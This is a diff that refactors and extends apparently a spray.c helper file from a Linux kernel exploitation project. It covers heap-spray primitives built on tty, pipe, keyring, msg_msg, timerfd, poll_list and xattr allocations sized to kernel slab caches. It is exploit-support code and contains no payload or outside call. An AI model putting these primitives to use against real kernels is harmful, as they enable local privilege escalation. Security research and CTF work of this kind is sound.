@@ -1,71 +1,76 @@
 #define _GNU_SOURCE
-#include <fcntl.h>
-#include <linux/keyctl.h>
-#include <sys/syscall.h>
-#include <stdbool.h>
-#include <sys/msg.h>
-#include <sys/shm.h>
-#include <time.h>
-#include <pthread.h>
-#include <sys/timerfd.h>
-#include <unistd.h>
 #include "spray.h"
 #include "../util/util.h"
+#include <attr/xattr.h>
+#include <fcntl.h>
+#include <linux/keyctl.h>
+#include <pthread.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <sys/msg.h>
+#include <sys/shm.h>
+#include <sys/syscall.h>
+#include <sys/timerfd.h>
+#include <time.h>
+#include <unistd.h>
 
-int pipes[0x1000][0x02];
-int qids[0x1000];
-int keys[0x1000];
-int seq_ops[0x10000];
-int ptmx[0x1000];
-int fds[0x1000];
-pthread_t poll_tids[0x1000];
-int n_keys;
+int g_pipes[0x1000][0x02];
+int g_qids[0x1000];
+int g_keys[0x1000];
+int g_seq_ops[0x10000];
+int g_ptmx[0x1000];
+int g_fds[0x1000];
+pthread_t g_poll_tids[0x1000];
+int g_n_keys;
 
 static int poll_threads;
 static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 void alloc_tty(int i) {
-    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+    g_ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 
-    if (ptmx[i] < 0) {
+    if (g_ptmx[i] < 0) {
         errExit("[X] alloc_tty");
     }
 }
 
 void free_tty(int i) {
-    if (close(ptmx[i]) < 0) {
+    if (close(g_ptmx[i]) < 0) {
         errExit("[X] free tty");
     }
 }
 
-void alloc_pipe_buf(int i)
-{
-    if (pipe(pipes[i]) < 0) {
+void alloc_pipe_buf(int i) {
+    if (pipe(g_pipes[i]) < 0) {
         errExit("alloc_pipe_buf");
         return;
     }
 }
 
-void release_pipe_buf(int i)
-{
-    if (close(pipes[i][0]) < 0) {
+void release_pipe_buf(int i) {
+    if (close(g_pipes[i][0]) < 0) {
         errExit("release_pipe_buf");
     }
 
-    if (close(pipes[i][1]) < 0) {
+    if (close(g_pipes[i][1]) < 0) {
         errExit("release_pipe_buf");
     }
 }
 
-static long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
+static long keyctl(int operation, unsigned long arg2, unsigned long arg3,
+                   unsigned long arg4, unsigned long arg5) {
     return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
 }
 
-static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
+static inline key_serial_t add_key(const char *type, const char *description,
+                                   const void *payload, size_t plen,
+                                   key_serial_t ringid) {
     long ret = syscall(__NR_add_key, type, description, payload, plen, ringid);
     if (ret < 0) {
         errExit("add_key");
     }
+
+    return ret;
 }
 
 long free_key(key_serial_t key) {
@@ -80,18 +85,21 @@ long free_key(key_serial_t key) {
     if (ret < 0) {
         errExit("keyctl unlink");
     }
+
+    return ret;
 }
 
-int get_key(int i, char* buf, size_t sz) {
-    long ret = keyctl(KEYCTL_READ, keys[i], buf, sz, 0);
+long get_key(int i, char *buf, size_t sz) {
+    long ret = keyctl(KEYCTL_READ, g_keys[i], (uint64_t)buf, sz, 0);
     if (ret < 0) {
         errExit("keyctl read");
     }
+
+    return ret;
 }
 
-void alloc_key(int id, char *buf, size_t size)
-{
-    char desc[0x400] = { 0 };
+void alloc_key(int id, char *buf, size_t size) {
+    char desc[0x400] = {0};
     char payload[0x1000] = {0};
     int key;
 
@@ -101,65 +109,59 @@ void alloc_key(int id, char *buf, size_t size)
 
     if (!buf) {
         memset(payload, 0x41, size);
-    }
-    else {
+    } else {
         memcpy(payload, buf, size);
     }
 
     key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
 
-    if (key < 0)
-	{
+    if (key < 0) {
         errExit("add_key");
-	}
+    }
 
-    keys[id] = key;
+    g_keys[id] = key;
 }
 
+long dealloc_key(int id) { free_key(g_keys[id]); }
+
 void alloc_qid(int i) {
-    qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-    if (qids[i] < 0) {
+    g_qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+    if (g_qids[i] < 0) {
         errExit("[X] msgget");
     }
 }
 
-void send_msg(int qid, int c, int size, long type)
-{
+void send_msg(int qid, int c, int size, long type) {
     int off = sizeof(msg_msg_t);
     if (size > PAGE_SZ) {
         off += sizeof(msg_msg_seg_t);
     }
 
-    struct msgbuf
-    {
+    struct msgbuf {
         long mtype;
         char mtext[size - off];
     } msg;
 
     if (!type) {
         msg.mtype = 0xffff;
-    }
-    else {
+    } else {
         msg.mtype = type;
     }
 
     memset(msg.mtext, c, sizeof(msg.mtext));
 
-    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
-    {
+    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
         errExit("msgsnd");
     }
 }
 
-void send_msg_payload(int qid, char* buf, int size, long type)
-{
+void send_msg_payload(int qid, char *buf, int size, long type) {
     int off = sizeof(msg_msg_t);
     if (size > PAGE_SZ) {
         off += sizeof(msg_msg_seg_t);
     }
 
-    struct msgbuf
-    {
+    struct msgbuf {
         long mtype;
         char mtext[size - off];
     } msg;
@@ -168,34 +170,29 @@ void send_msg_payload(int qid, char* buf, int size, long type)
 
     if (!type) {
         msg.mtype = 0xffff;
-    }
-    else {
+    } else {
         msg.mtype = type;
     }
 
-    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
-    {
+    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
         errExit("msgsnd");
     }
 }
 
-long recv_msg(int qid, void* data, int size, long type, bool copy)
-{
+long recv_msg(int qid, void *data, int size, long type, bool copy) {
     int off = sizeof(msg_msg_t);
     if (size > PAGE_SZ) {
         off += sizeof(msg_msg_seg_t);
     }
     int ret;
-    struct msg_buf
-    {
+    struct msg_buf {
         long mtype;
         char mtext[size - off];
     } msg;
 
     if (copy) {
         ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_COPY);
-    }
-    else {
+    } else {
         ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_NOERROR);
     }
 
@@ -208,51 +205,45 @@ long recv_msg(int qid, void* data, int size, long type, bool copy)
     return msg.mtype;
 }
 
-int create_timer(bool leak)
-{
-  struct itimerspec its;
+int create_timer(bool leak) {
+    struct itimerspec its;
 
-  its.it_interval.tv_sec = 0;
-  its.it_interval.tv_nsec = 0;
-  its.it_value.tv_sec = 2;
-  its.it_value.tv_nsec = 0;
+    its.it_interval.tv_sec = 0;
+    its.it_interval.tv_nsec = 0;
+    its.it_value.tv_sec = 2;
+    its.it_value.tv_nsec = 0;
 
-  int tfd = timerfd_create(CLOCK_REALTIME, 0);
-  timerfd_settime(tfd, 0, &its, 0);
+    int tfd = timerfd_create(CLOCK_REALTIME, 0);
+    timerfd_settime(tfd, 0, &its, 0);
 
-  if (leak)
-  {
-    close(tfd);
-    sleep(1);
-    return 0;
-  }
+    if (leak) {
+        close(tfd);
+        sleep(1);
+        return 0;
+    }
+
+    return tfd;
 }
 
-void init_fd(int i)
-{
-    fds[i] = open("/etc/passwd", O_RDONLY);
+void init_fd(int i) {
+    g_fds[i] = open("/etc/passwd", O_RDONLY);
 
-    if (fds[i] < 1)
-    {
+    if (g_fds[i] < 1) {
         errExit("[X] init_fd()");
     }
 }
 
-static int randint(int min, int max)
-{
-    return min + (rand() % (max - min));
-}
+static int randint(int min, int max) { return min + (rand() % (max - min)); }
 
-unsigned poll_fds_to_alloc(size_t sz)
-{
+unsigned poll_fds_to_alloc(size_t sz) {
     // stuff allocated on stack (inside stack_pps buf)
-    unsigned to_alloc = (STACK_PPS_SZ - sizeof(poll_list_t)) / sizeof(struct pollfd);
+    unsigned to_alloc =
+        (STACK_PPS_SZ - sizeof(poll_list_t)) / sizeof(struct pollfd);
 
     // subtract size needed for poll_list struct
     if (sz % PAGE_SZ == 0) {
         sz -= sz / PAGE_SZ * sizeof(poll_list_t);
-    }
-    else {
+    } else {
         sz -= (sz / PAGE_SZ + 1) * sizeof(poll_list_t);
     }
 
@@ -261,14 +252,13 @@ unsigned poll_fds_to_alloc(size_t sz)
     return to_alloc;
 }
 
-void* spray_poll_list(void* args)
-{
+void *spray_poll_list(void *args) {
     thread_args_t *ta = (thread_args_t *)args;
     int ret;
 
     struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));
 
-    for (int i = 0; i < ta->amt; i++) {
+    for (unsigned i = 0; i < ta->amt; i++) {
         pollers[i].fd = ta->fd_read;
         pollers[i].events = POLLERR;
     }
@@ -291,27 +281,26 @@ void* spray_poll_list(void* args)
         poll_threads--;
         pthread_mutex_unlock(&poll_mutex);
 
-        while (1) { };
+        while (1) {
+        };
     }
 
     return NULL;
 }
 
-void create_poll_thread(int i, thread_args_t *args)
-{
+void create_poll_thread(int i, thread_args_t *args) {
     int ret;
 
-    ret = pthread_create(&poll_tids[i], 0, spray_poll_list, (void *)args);
+    ret = pthread_create(&g_poll_tids[i], 0, spray_poll_list, (void *)args);
     if (ret != 0) {
         errExit("pthread_create");
     }
 }
 
-void join_poll_threads(void)
-{
+void join_poll_threads(void) {
     int ret;
     for (int i = 0; i < poll_threads; i++) {
-        ret = pthread_join(poll_tids[i], NULL);
+        ret = pthread_join(g_poll_tids[i], NULL);
 
         if (ret < 0) {
             errExit("pthread_join");
@@ -319,4 +308,36 @@ void join_poll_threads(void)
         open("/proc/self/stat", O_RDONLY);
     }
     poll_threads = 0x0;
+}
+
+int alloc_simple_xattr(char *path, int id, char *data, size_t size, bool edit) {
+    char name[0x100] = {0};
+    int ret;
+
+    if (size <= sizeof(struct simple_xattr))
+        return -1;
+
+    size -= sizeof(struct simple_xattr);
+    snprintf(name, sizeof(name), "security.%04d", id);
+
+    ret =
+        setxattr(path, name, data, size, !edit ? XATTR_CREATE : XATTR_REPLACE);
+    if (ret < 0) {
+        perror("[X] alloc_simple_xattr()");
+        return -1;
+    }
+
+    return ret;
+}
+
+int remove_simple_xattr(char *path, int id) {
+    char name[0x100] = {0};
+
+    snprintf(name, sizeof(name), "security.%04d", id);
+    if (removexattr(path, name) < 0) {
+        perror("[X] remove_simple_xattr()");
+        return -1;
+    }
+
+    return 0;
 }
